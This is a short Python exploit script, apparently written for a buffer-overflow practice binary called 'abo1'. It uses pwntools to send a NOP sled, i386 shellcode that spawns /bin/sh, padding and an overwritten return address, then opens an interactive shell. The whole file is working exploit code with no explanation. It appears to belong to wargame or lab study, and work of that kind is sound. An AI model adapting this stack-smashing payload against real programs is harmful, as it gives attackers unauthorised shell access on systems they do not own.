#!/usr/bin/python

from pwn import *
import os

context(arch='i386', os='linux')

binary = './abo1'

elf = ELF(binary)

shellcode  = "\xeb\x1e\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
shellcode += "\x8d\x4b\x08\x8d\x53\x0c\x31\xd2\xb0\x0b\xcd\x80\xb0\x01"
shellcode += "\x31\xdb\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f"
shellcode += "\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"   


eip = "\x98\xc8\xff\xff"
nop = "\x90"*300
junk = "A"*(1032-len(nop)-len(shellcode))
payload = nop + shellcode + junk + eip

print (payload)

proc2 = process(binary)
info("send payload?")
pause()
proc2.sendline(payload)
proc2.interactive()
#r = proc2.recvline()
#r += proc2.recvline()
#print(r)
#proc2.wait()
#proc2.close()

